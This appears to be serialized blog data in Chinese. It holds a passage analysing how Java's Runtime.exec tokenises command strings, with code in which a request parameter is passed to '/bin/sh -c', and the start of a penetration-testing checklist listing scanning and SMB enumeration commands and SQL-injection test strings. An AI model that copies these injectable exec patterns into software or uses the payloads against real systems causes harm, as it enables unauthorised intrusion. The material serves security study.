BufferedReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; InputStreamReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(in, &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;UTF8\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;));&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String line &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        while&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;((line&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;br.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;readLine&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;())&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;!=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;            System.out.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;println&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(line);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray[]，也就是传入一个数组。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String cmdarray[]) throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;     }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;而根据前面代码中，我们传入的命令是如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;所以会进入&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Process exec(String command)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这个构造方法进行处理，跟进这个方法，发现最后返回&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exec(command, null, null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String command) throws IOException {        return exec(command, null, null);    }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray[]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/23.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       return new ProcessBuilder(cmdarray)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;          .environment(envp)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .directory(dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .start();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。&lt;/p&gt;\n&lt;p&gt;然后继续往下走，这里调用java.lang.ProcessImpl.start。&lt;/p&gt;\n&lt;p&gt;进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。&lt;/p&gt;\n&lt;p&gt;这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c “echo 111 &gt; 3.txt”，看这两段代码的命令执行的效果。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;首先先看\n&lt;code&gt;String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/code&gt;\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{“/bin/sh”,“-c”,\&quot;\&quot;echo”,“111”、”&gt;”,“3.txt\&quot;\&quot;}。&lt;/p&gt;\n&lt;p&gt;而当前内存开辟一个12473进程，并且确实12473执行sh命令。&lt;/p&gt;\n&lt;p&gt;但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。&lt;/p&gt;\n&lt;p&gt;也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。&lt;/p&gt;\n&lt;p&gt;下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;url\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最后再来一段代码，下面这段代码才会是java下命令执行的完全体。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。&lt;/p&gt;\n&lt;p&gt;最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(String... command) {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = new ArrayList&amp;#x3C;&gt;(command.length);        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    for (String arg : command)            &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command.add(arg);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(List&amp;#x26;lt;String&amp;#x26;gt; command) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    if (command == null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    throw new NullPointerException();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = command;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。&lt;/p&gt;\n&lt;p&gt;原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。&lt;/p&gt;\n&lt;p&gt;所以Java下的命令稍微改造一下代码就好。&lt;/p&gt;\n&lt;p&gt;还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/24.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;小结\&quot;&gt;小结&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#小结\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。&lt;/p&gt;\n&lt;p&gt;所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。&lt;/p&gt;\n&lt;p&gt;java的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;差别&quot;],&quot;text&quot;:[0,&quot;差别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;小结&quot;],&quot;text&quot;:[0,&quot;小结&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/15&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2023-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Nmap基本扫描\n```\nnmap -Pn -p- -vv\nnmap -Pn -p- -sU -vv\n```\n***\n# 针对端口指纹和漏洞的扫描\n```\nNmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt;\n# 使用nc查看banner\nnc -nv &lt;ip-address&gt; &lt;port&gt;\n```\n***\n# 针对 web 端口的枚举\n```\nNikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt;\n# 目录扫描\nDirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt\nGobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt\n#如果想测试文件包含漏洞，可以使用 fimap：\nfimap -u &lt;ip-address&gt;\n```\n***\n# 针对已知的服务进行攻击尝试，搜索漏洞信息\n```\nSearchsploit &lt;service name&gt;\n```\n漏洞来源：\n&lt;https://www.securityfocus.com/vulnerabilities&gt;\n***\n# 针对 web 页面的测试\n检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项\n```\n测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）\n● NULL 或 null\n● &#39;, \&quot;, ;, &lt;!\n  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入\n● -, =, +, \&quot;\n  ○ 用于手工 SQL 注入测试\n● &#39;, &amp;, ! , ¦ , &lt; , &gt;\n  ○ 用于找出命令执行漏洞\n● ../\n  ○ 目录穿越漏洞\n```\n***\n# 针对 NETBIOS、SMB、RPC 端口的测试\n```\nenum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &lt;target ip&gt;\n```\n关于 RPC 历史漏洞的合集：\nhttp://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\n以下是常用的远程测试命令\n```\nShowmount -e &lt;ip address&gt;/&lt;port&gt; \nMount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=”” \nRlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U “” -N Nbtscan -r &lt;ip address&gt; \nNet use &lt;ip-address&gt;$Share “” /u:”” \nNet view &lt;ip-address&gt;\n```\n还可以使用 NMAP 的脚本测试 